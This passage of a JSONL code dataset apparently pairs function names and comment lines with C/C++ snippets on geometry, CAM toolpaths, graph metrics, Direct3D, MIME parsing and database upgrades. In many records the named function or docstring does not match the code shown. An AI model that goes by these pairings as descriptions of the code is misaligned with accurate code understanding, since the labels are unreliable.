100);\\n\\t\\t\/\/\\t}\\n\\n\\t\\t\/\/\\t\/\/ check and correct the height value\\n\\t\\t\/\/\\tif (inputrectangle[i].height < (10.42 * frame_rgb.rows \/ 100) || inputrectangle[i].height >(35.42 * frame_rgb.rows \/ 100)) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].height = (int)(26.25 * frame_rgb.rows \/ 100);\\n\\t\\t\/\/\\t}\\n\\t\\t\/\/}\\n\\n\\t\\t\/\/ correction so that the rectangle not exceed the frame size\\n\\t\\tfor (size_t i = 0; i < outputrectangle.size(); i++) {\\n\\t\\t\\tif (frame_rgb.cols < outputrectangle[i].x + outputrectangle[i].width) {\\n\\t\\t\\t\\toutputrectangle[i].x = outputrectangle[i].x - ((outputrectangle[i].x + outputrectangle[i].width) - frame_rgb.cols);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tfor (size_t i = 0; i < outputrectangle.size(); i++) {\\n\\t\\t\\tif (frame_rgb.rows < outputrectangle[i].y + outputrectangle[i].height) {\\n\\t\\t\\t\\toutputrectangle[i].y = outputrectangle[i].y - ((outputrectangle[i].y + outputrectangle[i].height) - frame_rgb.rows);\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\treturn outputrectangle;\\n\\t}'}","id":3271}
{"content":"{'function_name': 'isInCircle', 'docstring': '\/\/\u5224\u65ad\u5173\u7cfb\\r', 'code': 'int main(int argc, char* argv[])\\r\\n{\\r\\n\\r\\n\\t\/\/\u521b\u5efa\u5706\\r\\n\\tCircle circle;\\r\\n\\tcircle.setR(10);\\r\\n\\tPointer center;\\r\\n\\tcenter.setX(10);\\r\\n\\tcenter.setY(0);\\r\\n\\tcircle.setCenter(center);\\r\\n\\t\/\/\u521b\u5efa\u70b9\\r\\n\\tPointer pointer;\\r\\n\\tpointer.setX(10);\\r\\n\\tpointer.setY(10);\\r\\n\\t\/\/\u5224\u65ad\u5173\u7cfb\\r\\n\\tisInCircle(circle, pointer);\\r\\n\\treturn 0;\\r\\n}'}","id":3276}
{"content":"{'function_name': 'main', 'docstring': '\/\/ Q\u30c6\u30fc\u30d6\u30eb\u3092\u89e3\u653e', 'code': 'double vending_machine(int s, int a, int &sd){\\n\\tdouble reward;\\t\/\/ \u5831\u916c\\n\\n\\t\/\/ \u30b9\u30a4\u30c3\u30c11\u3092\u62bc\u3059\\n\\tif(a == 0){\\n\\t\\tsd = !s;\\t\/\/ \u30e9\u30f3\u30d7\u306eON,OFF\u3092\u5909\u66f4\\n\\t\\treward = 0;\\n\\t}\\n\\n\\t\/\/ \u30b9\u30a4\u30c3\u30c12\u3092\u62bc\u3059\\n\\telse{\\n\\t\\tif(s == 1){\\t\/\/ \u30e9\u30f3\u30d7ON\u306e\u3068\u304d\\n\\t\\t\\tsd = s;\\n\\t\\t\\treward = 10;\\t\\t\\n\\t\\t}\\n\\t\\telse{\\t\/\/ \u30e9\u30f3\u30d7OFF\u306e\u3068\u304d\\n\\t\\t\\tsd = s;\\n\\t\\t\\treward = 0;\\n\\t\\t}\\t\\n\\t}\\n\\t\\n\\treturn reward;\\n}'}","id":3281}
{"content":"{'function_name': 'MimeOleGetInternat', 'docstring': '\/\/ Done\\r', 'code': \"MIMEOLEAPI MimeOleSplitContentType(LPWSTR pszFull, LPWSTR *ppszCntType, LPWSTR *ppszSubType)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr = E_FAIL;\\r\\n    LPWSTR           pszFreeMe = NULL,\\r\\n                    psz = NULL,\\r\\n                    pszStart;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == pszFull)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Lets dup pszFull to make sure we have read access\\r\\n    psz = pszFreeMe = PszDupW(pszFull);\\r\\n    if (NULL == psz)\\r\\n    {\\r\\n        hr = TrapError(E_OUTOFMEMORY);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Find '\/'\\r\\n    pszStart = psz;\\r\\n    while(*psz && *psz != L'\/')\\r\\n        psz++;\\r\\n\\r\\n    \/\/ If not found, return\\r\\n    if (L'\\\\0' == *psz)\\r\\n        goto exit;\\r\\n\\r\\n    \/\/ Otherwise stuff a null\\r\\n    *psz = L'\\\\0';\\r\\n\\r\\n    \/\/ Dup\\r\\n    *ppszCntType = PszDupW(pszStart);\\r\\n    if (NULL == *ppszCntType)\\r\\n    {\\r\\n        hr = TrapError(E_OUTOFMEMORY);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Step over\\r\\n    *psz = L'\/';\\r\\n    psz++;\\r\\n\\r\\n    \/\/ If not found, return\\r\\n    if (L'\\\\0' == *psz)\\r\\n        goto exit;\\r\\n\\r\\n    \/\/ Save position\\r\\n    pszStart = psz;\\r\\n    while(*psz && L';' != *psz)\\r\\n        psz++;\\r\\n\\r\\n    \/\/ Save character...\\r\\n    *psz = L'\\\\0';\\r\\n\\r\\n    \/\/ Dup as sub type\\r\\n    *ppszSubType = PszDupW(pszStart);\\r\\n    if (NULL == *ppszSubType)\\r\\n    {\\r\\n        hr = TrapError(E_OUTOFMEMORY);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Success\\r\\n    hr = S_OK;\\r\\n\\r\\nexit:\\r\\n    \/\/ If failed\\r\\n    if (FAILED(hr))\\r\\n    {\\r\\n        SafeMemFree((*ppszCntType));\\r\\n        SafeMemFree((*ppszSubType));\\r\\n    }\\r\\n\\r\\n    \/\/ Cleanup\\r\\n    SafeMemFree(pszFreeMe);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}\"}","id":3285}
{"content":"{'function_name': 'dfs', 'docstring': '\/\/ \uc774\ubbf8 \ubc29\ubb38\ud55c \uacf3\uc774\ub77c\uba74', 'code': \"int solution(int n, vector<vector<int>> edge)\\n{\\n    int answer = 0;\\n\\n    vt.resize(n + 1);\\n    int rowSize = edge.size();\\n    for (int i = 0; i < rowSize; ++i) {\\n        vt[edge[i][0]].push_back(edge[i][1]);\\n        vt[edge[i][1]].push_back(edge[i][0]);\\n    }\\n    vector<bool> isCheck(n + 1, false);\\n    dist.resize(n + 1, 0);\\n    \/\/ isCheck[1] = true;\\n    \/\/ dfs(1, isCheck, 1);\\n    bfs(1);\\n    int maxNum = -1;\\n    \/\/ dist \uc911 \ucd5c\ub300\uac12\uc744 \ucc3e\ub294 for\ubb38\\n    for (int i = 1; i < n + 1; ++i) {\\n        if (maxNum < dist[i]) {\\n            maxNum = dist[i];\\n        }\\n    }\\n    \/\/ \ucd5c\ub300\uac12\uc744 \uac00\uc9c0\ub294 dist\uc758 \uc6d0\uc18c\uac00 \uba87 \uac1c \uc778\uc9c0 \ucc3e\ub294 for\ubb38\\n    for (int i = 1; i < n + 1; ++i) {\\n        if (maxNum == dist[i]) {\\n            ++answer;\\n        }\\n    }\\n    for (int i = 0; i < dist.size(); ++i) {\\n        cout << dist[i] << ' ';\\n    }\\n    cout << '\\\\n';\\n\\n    return answer;\\n}\"}","id":3287}
{"content":"{'function_name': 'calcPseudoInverse', 'docstring': '\/\/ V * (S^(-1)*U^(T))', 'code': 'double det(const cnoid::MatrixXd &_a)\\n    {\\n        assert( _a.rows() == _a.cols() );\\n        return _a.determinant();\\n        \/\/ simple determinant\\n    }'}","id":3289}
{"content":"{'function_name': 'loop', 'docstring': '\/\/ Convertir el tiempo en una distancia', 'code': 'long microsecondsToInches(long microseconds)\\n{\\n  \/\/ Segun la hoja de datos del paralaje para el PING))), hay\\n  \/\/ 73,746 microsegundos por pulgada (es decir, el sonido viaja a 1130 pies por\\n  \/\/ Segundo). Esto le da a la distancia recorrida por el ping, saliente\\n  \/\/ Y el regreso, asi que dividimos por 2 para obtener la distancia del obstaculo.\\n  \/\/ Ver: http:\/\/www.parallax.com\/dl\/docs\/prod\/acc\/28015-PING-v1.3.pdf\\n  return microseconds \/ 74 \/ 2;\\n}'}","id":3292}
{"content":"{'function_name': 'TrimLoopByTwoContours', 'docstring': '\/\/ STEP3 : \u8fde\u63a5\u66f2\u7ebf\u5e76\u5220\u9664\u7279\u522b\u5c0f\u7684', 'code': 'BOOL Is2ContoursInt( CSmartLoop * pLoop1, CSmartLoop * pLoop2, double dTol )\\n{\\n\\tif( !pLoop1 || !pLoop2 ) return FALSE ;\\n\\t\/\/(1)\u5305\u56f4\u76d2\u7c97\u5224\\n\\tBOX3D box1, box2 ;\\n\\tMathCam_GetLoopBox( pLoop1, &box1) ;\\n\\tMathCam_GetLoopBox( pLoop2, &box2) ;\\n\\tif( !ChkBox3DInt( &box1, &box2, dTol ) ) return FALSE ;\\n\\t\/\/(2)\u5224\u65adpLoop1\u5916\u73af\u4e0epLoop2\u7684\u8ddd\u79bb\\n\\tdouble dDist = 0. ;\\n\\tCSmartLoop *pIsland1 = NULL, *pIsland2 = NULL ;\\n\\tCSmartSect * pSectHead1 = NULL, *pSectHead2 = NULL ;\\n\\tpSectHead1 = pLoop1->GetSectHead() ;\\n\\tfor ( ; pSectHead1; pSectHead1 = pSectHead1->next )\\n\\t{\\n\\t\\tpSectHead2 = pLoop2->GetSectHead() ;\\n\\t\\tfor ( ; pSectHead2; pSectHead2 = pSectHead2->next )\\n\\t\\t{\\n\\t\\t\\tdDist = pSectHead1->MinDistBetween( pSectHead2 ) ;\\n\\t\\t\\tif( dDist < dTol ) return TRUE ;\\n\\t\\t}\\n\\t\\tpIsland2 = pLoop2->GetIsland() ;\\n\\t\\tfor ( ; pIsland2; pIsland2 = pIsland2->next )\\n\\t\\t{\\n\\t\\t\\tpSectHead2 = pIsland2->GetSectHead() ;\\n\\t\\t\\tfor ( ; pSectHead2; pSectHead2 = pSectHead2->next )\\n\\t\\t\\t{\\n\\t\\t\\t\\tdDist = pSectHead1->MinDistBetween( pSectHead2 ) ;\\n\\t\\t\\t\\tif( dDist < dTol ) return TRUE ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\t\/\/(3)\u5224\u65adpLoop1\u5b64\u5c9b\u4e0epLoop2\u7684\u8ddd\u79bb\\n\\tpIsland1 = pLoop1->GetIsland() ;\\n\\tfor ( ; pIsland1; pIsland1 = pIsland1->next )\\n\\t{\\n\\t\\tpSectHead1 = pIsland1->GetSectHead() ;\\n\\t\\tfor ( ; pSectHead1; pSectHead1 = pSectHead1->next )\\n\\t\\t{\\n\\t\\t\\tpSectHead2 = pLoop2->GetSectHead() ;\\n\\t\\t\\tfor ( ; pSectHead2; pSectHead2 = pSectHead2->next )\\n\\t\\t\\t{\\n\\t\\t\\t\\tdDist = pSectHead1->MinDistBetween( pSectHead2 ) ;\\n\\t\\t\\t\\tif( dDist < dTol ) return TRUE ;\\n\\t\\t\\t}\\n\\t\\t\\tpIsland2 = pLoop2->GetIsland() ;\\n\\t\\t\\tfor ( ; pIsland2; pIsland2 = pIsland2->next )\\n\\t\\t\\t{\\n\\t\\t\\t\\tpSectHead2 = pIsland2->GetSectHead() ;\\n\\t\\t\\t\\tfor ( ; pSectHead2; pSectHead2 = pSectHead2->next )\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tdDist = pSectHead1->MinDistBetween( pSectHead2 ) ;\\n\\t\\t\\t\\t\\tif( dDist < dTol ) return TRUE ;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\treturn FALSE ;\\n}'}","id":3293}
{"content":"{'function_name': 'CalcSmtCutPathLead', 'docstring': '\/\/ \u00e8\u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa', 'code': 'void CalcCutPathLeadIn( CSmtCheckMdl &CheckMdl, JDNC_TOL &cTol, JDNC_CONNECT3D &cConnect, \\n\\t\\t\\t\\t\\t\\tCSmtCutPath *pPath, CSmtCutPath *&LeadIn, BOOL bCheck, int nType )\\n{\\n\\t\/\/ \u9996\u5148\u5f97\u5230\u53c2\u6570\\n\\tint i = 0 ;\\n\\tFPNT3D pnt, tan, nor = { 0, 0, 1 } ;\\n\\tVEC3D vec ;\\n\\tmathFCpyPnt( pPath->m_pHead->m_fPoint, pnt ) ;\\n\\tif( bCheck )\\n        MathCAM_DefineNormalAt( CheckMdl, cTol, pnt, nor ) ;\\n\\telse\\n\\t{\\n\\t\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t\\t\\tnor[i] = ( ( CSmtCutPointEx *)pPath->m_pHead )->m_fSurfNor[i] ; \\n\\t}\\n\\tif( nType != surfncMethodSFinish )\\n        nor[2] = 0.f ;\\n\\tif( !nc_Normalize( nor, 3 ) )\\n\\t{\\n\\t\\tif( !bCheck )\\n\\t\\t{\\n\\t\\t\\tCSmtCutPointEx *pHead = ( CSmtCutPointEx* )pPath->m_pHead ;\\n\\t\\t\\tmathFCpyPnt( pHead->m_fSurfNor, nor ) ;\\n\\t\\t\\tnor[2] = 0. ;\\n\\t\\t\\tif( !nc_Normalize( nor, 3 ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t}\\n\\t}\\t\\n\\tmathFGetUnitVec( pPath->m_pHead->next->m_fPoint, pPath->m_pHead->m_fPoint, vec ) ;\\n\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t{\\n\\t\\ttan[i] = TFLOAT( vec[i] ) ;\\n\\t}\\n\\t\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa\\n\\tCSmtCutPath tmpLead( MINI_CONNECT_PATH ) ;\\n\\tif( !MathCAM_GenLeadPathEx( CheckMdl, cTol, cConnect, \\n\\t\\t\\t\\t\\t\\t\\t\\tpnt, tan, nor, tmpLead, bCheck ) )\\n\\t{\\n\\t\\treturn ;\\n\\t}\\n\\ttmpLead.ReverseDirect () ;\\n\\tLeadIn = new CSmtCutPath( MINI_CONNECT_PATH ) ;\\n\\tLeadIn->m_bFeedType = JDNC_FEEDTYPE_LEAD ;\\n\\tLeadIn->AppendCutPoint ( tmpLead.m_pHead ) ;\\n\\tLeadIn->DefineBox () ;\\n\\n\\ttmpLead.m_pHead = tmpLead.m_pTail = NULL ;\\n\\ttmpLead.ClearAllPoint () ;\\n\\t\\n}'}","id":3296}
{"content":"{'function_name': 'to_d3d_element', 'docstring': '\/\/ https:\/\/learn.microsoft.com\/en-us\/windows\/win32\/api\/d3d12\/ns-d3d12-d3d12_input_element_desc', 'code': 'inline D3D12_INPUT_ELEMENT_DESC to_d3d_element(\\n     const graphics::shaders::ivert_element& e,\\n      graphics::input_data_class_t inClass,\\n      graphics::input_slot_t slot) noexcept\\n   {\\n      \/\/ https:\/\/learn.microsoft.com\/en-us\/windows\/win32\/api\/d3d12\/ns-d3d12-d3d12_input_element_desc\\n      D3D12_INPUT_ELEMENT_DESC ret;\\n      ret.SemanticName = e.name().c_str();\\n      ret.SemanticIndex = static_cast<UINT>(e.index());\\n      ret.InputSlotClass = graphics::to_d3d_input_class(inClass);\\n      ret.InputSlot = graphics::to_d3d_input_slot(slot);\\n      ret.Format = e.format();\\n      ret.AlignedByteOffset = D3D12_APPEND_ALIGNED_ELEMENT;\\n      ret.InstanceDataStepRate = 0;\\n      return ret;\\n   }'}","id":3303}
{"content":"{'function_name': 'make_bernstein_local_cij_matrix', 'docstring': '\/*\\n    \/\/ CHECKING ORDER INTEGRATION\\n    Matrix<T, Dynamic, Dynamic> ret1_bis = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    \\n    \/\/ for Q1 , degree = 1-> integration of order 2\\n    auto qps2 = integrate(msh, cl, 2*(degree+di)); \/\/ integration of order 2k\\n\\n    for (auto& qp : qps2)\\n    {\\n        auto phi = cb.eval_basis(qp.first);\\n        \\n        auto phi_grad = cb.eval_gradients(qp.first);\\n    \\n        ret1_bis += qp.second * phi * ((phi_grad).col(1)).transpose();\\n    }\\n    \\n    std::cout<<\"THE CHECKING FOR CIJ ORDER IS \"<<\\'\\\\n\\'<<ret1 - ret1_bis<<std::endl;\\n    *\/', 'code': 'std::pair<Matrix<T, Dynamic, 1>,Matrix<T, Dynamic, 1> >\\nmake_bernstein_local_RHS_VEC(const Mesh& msh, const typename Mesh::cell_type& cl, size_t degree , const Fonction& f , size_t di = 0)\\n{\\n    \\n    cell_basis_Bernstein <Mesh,T> cb(msh, cl, degree);\\n    auto cbs = cb.size();\\n\\n    std::pair<Matrix<T, Dynamic, 1>,Matrix<T, Dynamic, 1> > ret = std::make_pair( Matrix<T, Dynamic, 1>::Zero(cbs, 1) , Matrix<T, Dynamic, 1>::Zero(cbs, 1) );\\n    \\n    auto qps = integrate(msh, cl, 2*(degree+di)); \/\/ integration of order 2k\\n\\n    for (auto& qp : qps)\\n    {\\n        auto b = cb.eval_basis(qp.first);\\n        auto value0 = f(qp.first,msh,cl).first;\\n        auto value1 = f(qp.first,msh,cl).second;\\n        ret.first += qp.second * value0 * b ;\\n        ret.second += qp.second * value1 * b ;\\n    }\\n    \\n    return ret;\\n}'}","id":3315}
{"content":"{'function_name': 'cos_th', 'docstring': '\/\/Cosine theorem', 'code': 'void parallelPlane(const VectorXd& r0, double l, VectorXd& r1)\\n{\\n  \/\/Plane with distace (l) from (r0(0) x + r0(1) y + r0(2) z + r0(3) = 0)\\n\\n  for(int i=0; i<3; i++)\\n      r1(i) = r0(i);\\n\\n  r1(3) = r0(3) - l * sqrt(r0(0)*r0(0)+r0(1)*r0(1)+r0(2)*r0(2));\\n\\n  return;\\n}'}","id":3316}
{"content":"{'function_name': 'GetBfsEffDiam_stl', 'docstring': '\/\/ average shortest path length\\r', 'code': 'double GetBfsEffDiam(const PGraph& Graph, const int& NTestNodes, const bool& IsDir, double& EffDiam, int& FullDiam, double& AvgSPL) {\\r\\n  EffDiam = -1;  FullDiam = -1;  AvgSPL = -1;\\r\\n  TIntFltH DistToCntH;\\r\\n  TBreathFS<PGraph> BFS(Graph);\\r\\n  \/\/ shotest paths\\r\\n  TIntV NodeIdV;\\r\\n  Graph->GetNIdV(NodeIdV);  NodeIdV.Shuffle(TInt::Rnd);\\r\\n  for (int tries = 0; tries < TMath::Mn(NTestNodes, Graph->GetNodes()); tries++) {\\r\\n    const int NId = NodeIdV[tries];\\r\\n    BFS.DoBfs(NId, true, ! IsDir, -1, TInt::Mx);\\r\\n    for (int i = 0; i < BFS.NIdDistH.Len(); i++) {\\r\\n      DistToCntH.AddDat(BFS.NIdDistH[i]) += 1; }\\r\\n  }\\r\\n  TIntFltKdV DistNbrsPdfV;\\r\\n  double SumPathL=0, PathCnt=0;\\r\\n  for (int i = 0; i < DistToCntH.Len(); i++) {\\r\\n    DistNbrsPdfV.Add(TIntFltKd(DistToCntH.GetKey(i), DistToCntH[i]));\\r\\n    SumPathL += DistToCntH.GetKey(i) * DistToCntH[i];\\r\\n    PathCnt += DistToCntH[i];\\r\\n  }\\r\\n  DistNbrsPdfV.Sort();\\r\\n  EffDiam = TSnap::TSnapDetail::CalcEffDiamPdf(DistNbrsPdfV, 0.9); \/\/ effective diameter (90-th percentile)\\r\\n  FullDiam = DistNbrsPdfV.Last().Key;                \/\/ approximate full diameter (max shortest path length over the sampled nodes)\\r\\n  AvgSPL = SumPathL\/PathCnt;                        \/\/ average shortest path length\\r\\n  return EffDiam;\\r\\n}'}","id":3319}
{"content":"{'function_name': 'GenerateCartesianSpaceCirclePoints', 'docstring': '\/\/we start at angle = 0', 'code': 'CartesianPointList GenerateDeviceSpaceCirclePoints(const CCartesianPoint& p, unsigned int radiusInPixels)\\n\/*******************************************************\/\\n{\\n    CartesianPointList toReturn;\\n    double cx = p.X();\\n    double cy = p.Y();\\n    const double scaleCartToDevX = CartesianToDeviceScaleXAxis();\\n    const double scaleCartToDevY = CartesianToDeviceScaleYAxis();\\n\\n    double numSegments = GetNumberOfCircleSegments(radiusInPixels); \/\/MAS - The algorithm seems to be ok except this part. Not sure the math behind how segments calculated.\\n    cout<<\"Number of device segments: \"<<numSegments<<endl;\\n\\tdouble theta = 2 * 3.1415926 \/ float(numSegments);\\n\\tdouble tangetial_factor = tan(theta);\/\/calculate the tangential factor\\n\\n\\tdouble radial_factor = cos(theta);\/\/calculate the radial factor\\n\\n\\tdouble x = radiusInPixels;\/\/we start at angle = 0\\n\\tdouble y = 0;\\n\\n\\tfor(int ii = 0; ii < numSegments; ii++)\\n\\t{\\n\\t    toReturn.push_back(CCartesianPoint((x*scaleCartToDevX)+cx, (y*scaleCartToDevY)+cy));\\n\\t\\t\/\/calculate the tangential vector\\n\\t\\t\/\/remember, the radial vector is (x, y)\\n\\t\\t\/\/to get the tangential vector we flip those coordinates and negate one of them\\n\\n\\t\\tdouble tx = -y;\\n\\t\\tdouble ty = x;\\n\\n\\t\\t\/\/add the tangential vector\\n\\n\\t\\tx += tx * tangetial_factor;\\n\\t\\ty += ty * tangetial_factor;\\n\\n\\t\\t\/\/correct using the radial factor\\n\\n\\t\\tx *= radial_factor;\\n\\t\\ty *= radial_factor;\\n\\t}\\n    return(toReturn);\\n}'}","id":3324}
{"content":"{'function_name': 'ErrDBDeleteUnicodeIndexes', 'docstring': \"\/\/  to ensure we don't do this again, we'll ask to fixup the table...\", 'code': 'INLINE ERR ErrDBUpgradeForLocalisation( PIB *ppib, const IFMP ifmp, const JET_GRBIT grbit )\\n{\\n    ERR         err;\\n    INST        * const pinst = PinstFromPpib( ppib );\\n    IFMP        ifmpT;\\n    BOOL        fIndexesUpdated = fFalse;\\n    BOOL        fIndexesDeleted     = fFalse;\\n    const WCHAR *rgsz[9];\\n\\n    \/\/  judging from the call site, this grbit should never make it here!?!?\\n    Expected( 0 == ( grbit & JET_bitDbDeleteUnicodeIndexes ) );\\n\\n    BOOL        fReadOnly;\\n\\n    \/\/  Write out header with build # = 0 so that any crash from now\\n    \/\/  will have build # 0. This will cause upgrade again till it is done.\\n    WCHAR *         wszDatabaseName     = g_rgfmp[ifmp].WszDatabaseName();\\n\\n    Assert( UlParam( pinst, JET_paramEnableIndexChecking ) == JET_IndexCheckingOn || BoolParam( pinst, JET_paramEnableIndexCleanup ) );\\n\\n    Call( ErrDBOpenDatabase( ppib, wszDatabaseName, &ifmpT, NO_GRBIT ) );\\n    fReadOnly = ( JET_wrnFileOpenReadOnly == err || grbit & JET_bitDbReadOnly );\\n\\n    Assert( ifmp == ifmpT );\\n\\n    if ( 0 == g_rgfmp[ifmp].Pdbfilehdr()->le_dwMajorVersion )\\n    {\\n        WCHAR   rgszVerInfo[4][16];\\n\\n        OSStrCbFormatW( rgszVerInfo[0], sizeof(rgszVerInfo[0]), L\"%d\", g_dwGlobalMajorVersion );\\n        OSStrCbFormatW( rgszVerInfo[1], sizeof(rgszVerInfo[1]), L\"%d\", g_dwGlobalMinorVersion );\\n        OSStrCbFormatW( rgszVerInfo[2], sizeof(rgszVerInfo[2]), L\"%d\", g_dwGlobalBuildNumber );\\n        OSStrCbFormatW( rgszVerInfo[3], sizeof(rgszVerInfo[3]), L\"%d\", g_lGlobalSPNumber );\\n\\n        rgsz[0] = wszDatabaseName;\\n        rgsz[1] = rgszVerInfo[0];\\n        rgsz[2] = rgszVerInfo[1];\\n        rgsz[3] = rgszVerInfo[2];\\n        rgsz[4] = rgszVerInfo[3];\\n\\n        UtilReportEvent(\\n                eventInformation,\\n                DATA_DEFINITION_CATEGORY,\\n                START_INDEX_CLEANUP_UNKNOWN_VERSION_ID,\\n                5,\\n                rgsz,\\n                0,\\n                NULL,\\n                PinstFromPpib( ppib ) );\\n    }\\n    else\\n    {\\n        WCHAR   rgszVerInfo[8][16];\\n\\n        OSStrCbFormatW( rgszVerInfo[0], sizeof(rgszVerInfo[0]), L\"%d\", DWORD( g_rgfmp[ifmp].Pdbfilehdr()->le_dwMajorVersion ));\\n        OSStrCbFormatW( rgszVerInfo[1], sizeof(rgszVerInfo[1]), L\"%d\", DWORD( g_rgfmp[ifmp].Pdbfilehdr()->le_dwMinorVersion ));\\n        OSStrCbFormatW( rgszVerInfo[2], sizeof(rgszVerInfo[2]), L\"%d\", DWORD( g_rgfmp[ifmp].Pdbfilehdr()->le_dwBuildNumber ));\\n        OSStrCbFormatW( rgszVerInfo[3], sizeof(rgszVerInfo[3]), L\"%d\", DWORD( g_rgfmp[ifmp].Pdbfilehdr()->le_lSPNumber ));\\n        OSStrCbFormatW( rgszVerInfo[4], sizeof(rgszVerInfo[4]), L\"%d\", g_dwGlobalMajorVersion );\\n        OSStrCbFormatW( rgszVerInfo[5], sizeof(rgszVerInfo[5]), L\"%d\", g_dwGlobalMinorVersion );\\n        OSStrCbFormatW( rgszVerInfo[6], sizeof(rgszVerInfo[6]), L\"%d\", g_dwGlobalBuildNumber );\\n        OSStrCbFormatW( rgszVerInfo[7], sizeof(rgszVerInfo[7]), L\"%d\", g_lGlobalSPNumber );\\n\\n        rgsz[0] = wszDatabaseName;\\n        rgsz[1] = rgszVerInfo[0];\\n        rgsz[2] = rgszVerInfo[1];\\n        rgsz[3] = rgszVerInfo[2];\\n        rgsz[4] = rgszVerInfo[3];\\n        rgsz[5] = rgszVerInfo[4];\\n        rgsz[6] = rgszVerInfo[5];\\n        rgsz[7] = rgszVerInfo[6];\\n        rgsz[8] = rgszVerInfo[7];\\n\\n        UtilReportEvent(\\n                eventInformation,\\n                DATA_DEFINITION_CATEGORY,\\n                START_INDEX_CLEANUP_KNOWN_VERSION_ID,\\n                9,\\n                rgsz,\\n                0,\\n                NULL,\\n                PinstFromPpib( ppib ) );\\n    }\\n\\n    if( JET_IndexCheckingOn == UlParam( pinst, JET_paramEnableIndexChecking )\\n         || BoolParam( pinst, JET_paramEnableIndexCleanup ) )\\n    {\\n        CATCheckIndicesFlags catcifFlags;\\n        if ( fReadOnly )\\n        {\\n            catcifFlags = catcifReadOnly;\\n        }\\n        else\\n        {\\n            catcifFlags = catcifUpdateEmptyIndices;\\n            if ( grbit & JET_bitDbDeleteCorruptIndexes )\\n            {\\n                catcifFlags |= catcifDeleteOutOfDateSecondaryIndices;\\n            }\\n        }\\n\\n        err = ErrCATDeleteOrUpdateOutOfDateLocalizedIndexes(\\n                    ppib,\\n                    ifmpT,\\n                    catcifFlags,\\n                    &fIndexesUpdated,\\n                    &fIndexesDeleted );\\n    }\\n    else\\n    {\\n        \/\/  don\\'t do anything\\n        err = JET_errSuccess;\\n    }\\n\\n    CallS( ErrDBCloseDatabase( ppib, ifmpT, 0 ) );\\n\\n    Call( err );\\n\\n    rgsz[0] = wszDatabaseName;\\n    \\n    UtilReportEvent(\\n            eventInformation,\\n            DATA_DEFINITION_CATEGORY,\\n            STOP_INDEX_CLEANUP_ID,\\n            1,\\n            rgsz,\\n            0,\\n            NULL,\\n            PinstFromPpib( ppib ) );\\n\\n    \/\/  Update the header with the new version info\\n\\n    {\\n    PdbfilehdrReadWrite pdbfilehdr = g_rgfmp[ifmp].PdbfilehdrUpdateable();\\n    pdbfilehdr->le_dwMajorVersion = g_dwGlobalMajorVersion;\\n    pdbfilehdr->le_dwMinorVersion = g_dwGlobalMinorVersion;\\n    pdbfilehdr->le_dwBuildNumber = g_dwGlobalBuildNumber;\\n    pdbfilehdr->le_lSPNumber = g_lGlobalSPNumber;\\n    pdbfilehdr->ResetUpgradeDb();\\n    }\\n\\n    \/\/  Update the MSysLocales table with the new info for indices\\' locales\\n\\n    Call( ErrCATVerifyMSLocales( ppib, ifmp, fTrue \/* fixup table *\/ ) );\\n\\n#ifndef RTM\\n    \/\/ check it worked \\n    AssertRTL( JET_errDatabaseCorrupted != ErrCATVerifyMSLocales( ppib, ifmp, fFalse \/* fixup table *\/ ) );\\n#endif\\n\\n    if ( fIndexesDeleted )\\n    {\\n        \/\/  signal version cleanup to reclaim space from\\n        \/\/  the deleted indices (in case the user recreates\\n        \/\/  the indices, the hope is that space requests\\n        \/\/  will be serviced by space released from the\\n        \/\/  deleted indices)\\n        \/\/\\n        VERSignalCleanup( ppib );\\n        err = ErrERRCheck( JET_wrnCorruptIndexDeleted );\\n    }\\n    else\\n    {\\n        err = JET_errSuccess;\\n    }\\n\\n    return err;\\n\\nHandleError:\\n\\n    return err;\\n}'}","id":3326}
{"content":"{'function_name': 'initchengzu', 'docstring': '\/*\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u5982A[j].B[k],\u5176\u4e2dA[j]\u662f\u5b58\u653e\u7ec4\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u6bcf\u4e2a\u7ec4\u6709\u4e94\u5341\u4e2ai\u8282\u70b9*\/', 'code': 'void huishou(int Hui){\/\/Hui\u662f\u56de\u6536\u7684\u5757\u6570\\n    while(1){\\n            int i=0;\\n        if(Hui+A[j].B[0].num<=50)\\n        {\\n            for(int i=A[j].B[0].num;i<Hui+A[j].B[0].num;i++)\\n            {\\n                A[j].B[i].ID=0;\/\/\u8fd9\u4e2a\u5730\u65b9\u5e94\u4f20\u8fdb\u6765\u4e00\u4e2a\u8282\u70b9\u53f7\u7684\u6570\u7ec4\uff0c\\n                PushST(S,A[j].B[i]);\\n                A[j].B[0].num++;\\n            }\\n            return ;\/\/break;\\n        }\\n        if(Hui+A[j].B[0].num>50)\\n        {\\n            while(1){\\n                PopST(S);\\n            }\\n           for(i=A[j].B[0].num;i<50;i++)\\n           {\\n               A[j].B[0].num++;\\n               A[j].B[i].ID=0;                                     \/\/\u8fd9\u5e94\u8be5\u4f20\u8fdb\u6765\u56de\u6536\u7684\u5757\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\n           }\\n           Hui=Hui-A[j].B[0].num;\\n           